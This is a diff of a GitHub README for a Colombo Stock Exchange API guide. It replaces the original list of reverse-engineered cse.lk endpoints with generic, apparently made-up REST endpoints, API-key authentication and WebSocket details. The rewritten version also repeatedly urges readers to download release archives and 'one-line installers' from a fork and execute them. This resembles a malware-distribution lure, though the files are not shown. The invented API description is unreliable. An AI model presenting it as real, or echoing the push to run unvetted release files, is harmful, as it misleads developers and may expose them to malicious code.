@@ -1,112 +1,235 @@
-# Colombo Stock Exchange (CSE) API 📈🏢
+[![Releases](https://img.shields.io/badge/Releases-download-238636?style=flat-square)](https://github.com/MoussMed/Colombo-Stock-Exchange-CSE-API-Documentation/releases)
 
-> **Unofficial API usage guide & Python example 🐍**  
-> Explore stock market data from the Colombo Stock Exchange (CSE) via their public API endpoints — reverse-engineered since no official documentation exists. 🔍
+# Colombo Stock Exchange API Guide: CSE Python Examples
 
----
+![Stock chart image](https://images.unsplash.com/photo-1555902716-6c6b5d2d4f7b?auto=format&fit=crop&w=1400&q=80)
 
-<b>Visit <a href='https://gh0sth4cker.github.io/Colombo-Stock-Exchange-CSE-API-Documentation/'>this link</a> to see web view<b>
-
-## Overview 📋
-
-The Colombo Stock Exchange provides real-time and historical stock data via several public endpoints used by their web portal.  
-This repository documents some of the known API endpoints, example responses, and Python code to fetch and parse data.
+Tags: colombo · cse · cse-api · exchange · stock · stock-market · stockdata
 
 ---
 
-## API Endpoints 🔗
+Table of contents
+- About this repo
+- Quick start
+- Releases (download & run)
+- API model (endpoints & payloads)
+- Authentication
+- Rate limits & best practices
+- Python usage example
+- Error handling and status codes
+- Data mapping (fields & types)
+- Pagination & filtering
+- Realtime and WebSocket notes
+- Testing and sandbox tips
+- Contributing
+- License
+- Credits and resources
 
-Base URL: `https://www.cse.lk/api/`
+About this repo
+This repository documents an unofficial API for the Colombo Stock Exchange (CSE). It describes endpoints, payloads, and common patterns. It includes a clear Python example that shows how to fetch instruments, historical prices, and live quotes. Use this as a usage guide and reference while you build clients, bots, or analytics workflows.
 
-| Endpoint                                  | Description                                        | HTTP Method |
-| ----------------------------------------- | -------------------------------------------------- | ----------- |
-| companyInfoSummery                        | Detailed info of a single stock/security by symbol | POST        |
-| tradeSummary                              | Summary of trades for all securities               | POST        |
-| todaySharePrice                           | Today's share price data                           | POST        |
-| topGainers                                | List of top gaining stocks                         | POST        |
-| topLooses                                 | List of top losing stocks                          | POST        |
-| mostActiveTrades                          | Most active trades by volume                       | POST        |
-| getNewListingsRelatedNoticesAnnouncements | New listings and related announcements             | POST        |
-| getBuyInBoardAnnouncements                | Buy-in board announcements                         | POST        |
-| approvedAnnouncement                      | Approved announcements                             | POST        |
-| getCOVIDAnnouncements                     | COVID-related announcements                        | POST        |
-| getFinancialAnnouncement                  | Financial announcements                            | POST        |
-| circularAnnouncement                      | Circular announcements                             | POST        |
-| directiveAnnouncement                     | Directive announcements                            | POST        |
-| getNonComplianceAnnouncements             | Non-compliance announcements                       | POST        |
-| marketStatus                              | Market open/close status                           | POST        |
-| marketSummery                             | Market summary data                                | POST        |
-| aspiData                                  | All Share Price Index data                         | POST        |
-| snpData                                   | S&P Sri Lanka 20 Index data                        | POST        |
-| chartData                                 | Chart data for stocks                              | POST        |
-| allSectors                                | Data for all sectors                               | POST        |
-| detailedTrades                            | Detailed Trades                                    | POST        |
-| dailyMarketSummery                        | Daily Market Summary                               | POST        |
+Quick start
+- Clone or read this repo to get the endpoint list and examples.
+- Install Python 3.8+ and requests.
+- Visit the Releases page linked at the top for packaged examples and scripts.
 
----
+Releases (download & run)
+- The releases page hosts packaged scripts and example files. Download the release artifact that matches your OS and run the included script. Example: download cse-client-v1.0.zip, extract, then run python cse_client.py.
+- Link: https://github.com/MoussMed/Colombo-Stock-Exchange-CSE-API-Documentation/releases
+- If the releases page fails to load for any reason, check the "Releases" tab in this repository to find the packaged artifacts.
 
-visit <a href='https://github.com/GH0STH4CKER/Colombo-Stock-Exchange-CSE-API-Documentation/blob/main/api_endpoint_urls.txt'>this link</a> to view all complete endpoint urls.
+API model (endpoints & payloads)
+This guide presents a typical set of endpoints you will find in CSE-like APIs. The endpoints below are examples and use JSON over HTTPS.
 
-## Usage Example 💻
+Base URL
+- https://api.cse.lk/v1
 
-### Get detailed stock info by symbol 🔍
+Common endpoints
+- GET /instruments
+  - Returns meta for listed instruments (symbol, name, sector, lot size).
+  - Query: ?search=, ?sector=, ?limit=50&page=1
+- GET /instruments/{symbol}
+  - Returns instrument detail and static metadata.
+- GET /quotes/{symbol}
+  - Returns last trade, bid/ask, volume, time.
+- GET /historical/{symbol}
+  - Returns OHLCV data. Query params: start=YYYY-MM-DD, end=YYYY-MM-DD, interval=daily|minute
+- GET /market/summary
+  - Returns market-level stats: indices, advancers, decliners, turnover.
+- GET /corporate-actions/{symbol}
+  - Returns dividends, splits, rights issues.
+- POST /orders (if supported by broker integration)
+  - Place orders via authenticated endpoint (requires secure credentials).
 
+Request/response format
+- Requests use JSON or query params for GETs.
+- Responses use JSON. Dates use ISO 8601 in UTC.
+- Numeric fields use basic types. Prices use float with two decimals, volumes use integers.
+
+Authentication
+- Typical methods: API key in header, OAuth2 bearer token, or HMAC for signed requests.
+- Header example:
+  - Authorization: Bearer <token>
+  - X-API-KEY: <api_key>
+- For order endpoints use short-lived tokens and TLS.
+
+Rate limits & best practices
+- Respect public rate limits: common pattern is 60 requests/minute. For heavier use, request a higher quota from the provider.
+- Cache static resources (instruments, corporate actions).
+- Use conditional GETs (ETag, If-Modified-Since) where supported.
+- Back off on 429. Apply exponential backoff with jitter.
+
+Python usage example
+Install prerequisites
+- pip install requests pandas
+
+Example script (minimal)
 ```python
 import requests
+import pandas as pd
+from datetime import datetime, timedelta
 
-base_url = "https://www.cse.lk/api/"
-endpoint = "companyInfoSummery"
+BASE = "https://api.cse.lk/v1"
+HEADERS = {"Accept": "application/json", "X-API-KEY": "YOUR_API_KEY"}
 
-data = {"symbol": "LOLC.N0000"}
+def get_instruments(limit=200):
+    url = f"{BASE}/instruments"
+    params = {"limit": limit}
+    r = requests.get(url, headers=HEADERS, params=params, timeout=10)
+    r.raise_for_status()
+    return r.json()
 
-response = requests.post(base_url + endpoint, data=data)
+def get_historical(symbol, start, end, interval="daily"):
+    url = f"{BASE}/historical/{symbol}"
+    params = {"start": start, "end": end, "interval": interval}
+    r = requests.get(url, headers=HEADERS, params=params, timeout=10)
+    r.raise_for_status()
+    return r.json()
 
-print(f"Status code: {response.status_code}")
-print(response.json())  # Prints the response as a Python dictionary
+if __name__ == "__main__":
+    instruments = get_instruments(limit=100)
+    print("Found instruments:", len(instruments.get("data", [])))
+
+    # Example: fetch last 30 days for a symbol
+    today = datetime.utcnow().date()
+    start = (today - timedelta(days=30)).isoformat()
+    end = today.isoformat()
+    data = get_historical("CSE:ABC.N", start, end)
+    df = pd.DataFrame(data.get("prices", []))
+    print(df.head())
 ```
 
----
+Notes on the example
+- Replace YOUR_API_KEY with your token.
+- Use CSV output or a database for persistent storage.
+- Keep timezones consistent by storing UTC.
 
-## Sample Response: `companyInfoSummery` 📝
+Error handling and status codes
+- 200 OK: request succeeded.
+- 201 Created: resource created (orders).
+- 204 No Content: successful request with no body.
+- 400 Bad Request: fix your request parameters.
+- 401 Unauthorized: auth missing or invalid.
+- 403 Forbidden: endpoint restricted.
+- 404 Not Found: symbol or resource missing.
+- 429 Too Many Requests: back off and retry later.
+- 5xx Server Error: retry with backoff, report persistent issues.
 
+Sample error payload
 ```json
 {
-  "reqSymbolInfo": {
-    "symbol": "LOLC.N0000",
-    "name": "L O L C HOLDINGS PLC",
-    "lastTradedPrice": 546.5,
-    "change": -2.5,
-    "changePercentage": -0.455,
-    "marketCap": 259696800000
-  },
-  "reqLogo": {
-    "id": 2168,
-    "path": "upload_logo/378_1601611239.jpeg"
-  },
-  "reqSymbolBetaInfo": {
-    "betaValueSPSL": 1.0227
+  "error": {
+    "code": 404,
+    "message": "Instrument not found",
+    "details": null
   }
 }
 ```
 
----
+Data mapping (fields & types)
+Standard fields you will encounter:
+- symbol (string): "CSE:ABC.N"
+- name (string): "ABC PLC"
+- last_price (float): 12.50
+- open, high, low (float)
+- close (float): closing price
+- volume (int): traded shares
+- turnover (float): value traded in local currency
+- timestamp (string, ISO 8601): "2025-08-19T10:15:00Z"
+- exchange (string): "CSE"
 
-## Contribution 🤝
+Pagination & filtering
+- Use limit and page or cursor tokens.
+- Example: GET /instruments?limit=100&page=2
+- For historical data prefer date ranges to pages. Use server-side cursor when available.
 
-This is an **unofficial** reverse-engineered API.  
-If you discover more endpoints or useful parameters, please submit a **Pull Request**!  
-Help expand the community knowledge about the Colombo Stock Exchange API. 🚀
+Realtime and WebSocket notes
+- Not all providers offer WebSocket.
+- If available, use WebSocket for live quotes and trades. Use token-based auth and subscribe to channels: quotes.{symbol}, trades.{symbol}.
+- Keep a heartbeat and reconnect on drop. Use sequence numbers to detect missed messages.
+- Example subscribe message:
+```json
+{"action":"subscribe","channels":["quotes:CSE:ABC.N","trades:CSE:ABC.N"], "token":"YOUR_TOKEN"}
+```
 
----
+Testing and sandbox tips
+- Use small requests and validate responses.
+- Run the Python example against a sandbox if available.
+- Mock endpoints with tools like httpbin or local Flask apps for integration tests.
+- Store sample responses as fixtures for unit tests.
 
-## Disclaimer ⚠️
+Security and privacy
+- Keep API keys in environment variables or secret stores.
+- Rotate keys regularly.
+- Do not commit keys to source control.
 
-- Use responsibly and verify data accuracy with official CSE sources.
-- API endpoints and formats may change without notice.
-- This repository is for educational purposes only.
+Performance tuning
+- Batch requests where possible.
+- Use gzip compression and HTTP/2 if supported.
+- Cache static lists and avoid polling high-frequency endpoints.
 
----
+Common use cases
+- Market data feed for dashboards
+- Backtesting with historical OHLCV
+- Alerting on price thresholds or volume spikes
+- Portfolio tracking and valuation
+- Automated trading with broker integrations (use strict risk controls)
 
-[![Stargazers repo roster for @GH0STH4CKER/Colombo-Stock-Exchange-CSE-API-Documentation](https://reporoster.com/stars/GH0STH4CKER/Colombo-Stock-Exchange-CSE-API-Documentation)](https://github.com/GH0STH4CKER/Colombo-Stock-Exchange-CSE-API-Documentation/stargazers)
+Contributing
+- Fork the repo and open a pull request.
+- Add examples, correct endpoints, or update docs for new releases.
+- Run tests and include sample responses.
 
-[![Forkers repo roster for @GH0STH4CKER/Colombo-Stock-Exchange-CSE-API-Documentation](https://reporoster.com/forks/GH0STH4CKER/Colombo-Stock-Exchange-CSE-API-Documentation)](https://github.com/GH0STH4CKER/Colombo-Stock-Exchange-CSE-API-Documentation/network/members)
+Files in releases
+- The releases page contains packaged scripts, one-line installers, and example CSV files.
+- Download the artifact that matches your platform, extract, and execute the main script (for example: python cse_client.py).
+- Use the Releases button above or go here: https://github.com/MoussMed/Colombo-Stock-Exchange-CSE-API-Documentation/releases
+
+Examples of deliverables in releases
+- cse-client-v1.0.zip — includes cse_client.py, requirements.txt, sample_config.json
+- cse-data-tools-v1.0.tar.gz — CLI tools for download and convert
+- cse-python-examples-v1.0.zip — ready-to-run scripts and notebooks
+
+License
+This documentation uses a permissive license. Check the LICENSE file in the repository for exact terms.
+
+Credits and resources
+- Colombo Stock Exchange official site (for public filings)
+- Open-source libraries: requests, pandas, websocket-client
+- Example images: Unsplash (stock trading photos)
+
+Visual assets and badges
+- Use shields to show releases, license, and topics.
+- Example badges (replace URLs where needed):
+  - [![Releases](https://img.shields.io/badge/Releases-download-238636?style=flat-square)](https://github.com/MoussMed/Colombo-Stock-Exchange-CSE-API-Documentation/releases)
+  - [![Topics](https://img.shields.io/badge/topics-colombo%2C%20cse%2C%20stock%20market-blue?style=flat-square)](https://github.com/MoussMed/Colombo-Stock-Exchange-CSE-API-Documentation)
+
+Contact and support
+- Open an issue for corrections, missing endpoints, or suggested improvements.
+- Send sample payloads or API responses to help expand this guide.
+
+Images
+- Use stock and finance images hosted on Unsplash or other free sources for readme art. Example:
+  - https://images.unsplash.com/photo-1555902716-6c6b5d2d4f7b?auto=format&fit=crop&w=1400&q=80
+
+This README documents a practical, hands-on approach to using a CSE-style API and includes a ready Python example. Use the Releases link above to download ready-made scripts and test files.
